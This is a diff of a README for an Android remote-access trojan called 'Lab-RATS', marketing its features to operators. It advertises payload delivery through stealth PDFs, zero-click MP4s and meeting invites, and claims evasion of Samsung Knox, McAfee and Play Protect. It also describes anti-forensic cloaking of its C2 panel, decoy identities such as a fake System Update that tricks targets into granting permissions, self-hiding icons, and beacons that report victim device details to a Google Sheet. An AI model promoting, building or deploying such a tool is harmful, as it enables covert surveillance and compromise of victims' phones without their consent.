@@ -1,4 +1,5 @@
-<img width="1266" height="354" alt="Screenshot 2026-09-27 at 4 09 43 PM" src="https://github.com/user-attachments/assets/db8e6f75-aa43-43c5-a3d4-197fb844d81f" />
+<p align="center">
+<img width="1417" height="382" alt="Screenshot 2026-09-29 at 2 07 28 AM" src="https://github.com/user-attachments/assets/b77a5010-165b-45fd-90f4-552d9a6a6c70" />
 
 
 <p align="center">
@@ -36,24 +37,30 @@
 
 ---
 
-## 🕵️ Covert & Stealth
+## 🕵️ Covert & Stealth Operations
 
-### 💉 **NEW!** **Payload Delivery Vectors** *(for installing APK onto Target Device)*:
-- The **weaponization engine** has been overhauled to support **multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and many more)*, ensuring **reliable access** across **all modern mobile environments**.
+### 💉 **NEW!** **Payload Delivery Vectors** *(Installing APK onto Target Device)*:
+- The **Weaponization Engine** has been **overhauled to support multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)*, **ensuring reliable access** across **all modern mobile environments**.
 
-### 🛡️  **Evasion Engine**:
+### 🛡️ **Evasion Engine**:
 -  **Undetectable by Samsung Knox**, **McAfee** and **Google Play Protect**.
 -  **Deep Stealth HTML Shield**: The C2 interface utilizes **Shadow DOM Cloaking** and **Base64 Payload Wrapping**. Browser "Elements" inspection is **zeroed-out**, and the tactical structure is **ghosted from analysts**.
 -  **Web Hardening**: Assets (JS/CSS) are **minified and obfuscated**; featuring **anti-debugging loops** and **interaction locks** (Right-Click, F12) to prevent unauthorized analysis.
 - **Dynamic Code Obfuscation**: Build-time **randomization** of **logic flow and class names** via ProGuard/R8 integration.
 - **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.
 
-### 🎭 **Stealth Mode**:
-**Remotely swap the entire app identity and icon** with **the "Masquerade Library"** of **Fully Functional Clones**:
+### 🎭 **Stealth App Decoys**:
+**Remotely swap the entire Lab-RATS app identity and icon** using **the "Masquerade Library"** of **Fully Functional Clones**:
+- 👀 **System Update** *(Default)*: **Used for initial install** it **simulates a system update** and **asks for permissions during the process**, achieving **highly successful installs**.
 - 🧮 **Calculator**: Performs **actual math** with a tactical logic engine.
 - 🌦️ **Weather App**: Displays **real-time localized forecasts** via Open-Meteo API.
-- 🛡️ **Play Protect**: Simulates **a legitimate security scan** to build target trust.
-- 👀 **System Update**: **Best for initial install** it **simulates a system update** and **asks for permissions during the process**, achieving **highly successful installs**.
+- 🛡️ **Play Protect**: Simulates **a legitimate security scan** to **build target trust**.
+- 🐭 **Lab-Rats & System Stability Services** ("Restore Normal" in C2 Dashboard)*: **Completely unmasked** and **directly opens** the C2 server app screen.
+<details>
+  <summary>📸 Click to view App Decoy Icons</summary>
+  <br>
+  <img src="https://github.com/user-attachments/assets/f2114dda-1090-4395-add2-6007f48cff8f" alt="Full Web Page Screenshot" width="50%">
+</details>
 
 ### ☎️ **Emergency Recovery** & **Self-Healing**:
 - **Icon Restore**: If the **launcher icon is in Stealth Mode**, **dial `*#1337#` on the devices dialpad** to **instantly** restore the **Lab-RATS dashboard**.
@@ -261,8 +268,11 @@ Once the **Target device** downloads the **APK**:
 3.  **Self-Vanishing**: A few seconds **after launch, the app will automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
 4.  **Uplink Confirmation**: Check your **Google Sheet**. Within **5 seconds of initialization**, the **Device Brand & Model #, Connection Type, IP Address, Port #, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status and Storage Space will appear in the log**.
 
-### Example Google Sheet Reporting:
-> <img width="1047" height="418" alt="Google Sheet Reporting" src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" />
+<details>
+  <summary>📸 Click to view Example Google Sheet Reporting</summary>
+  <br>
+  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
+</details>
 
 ---
 
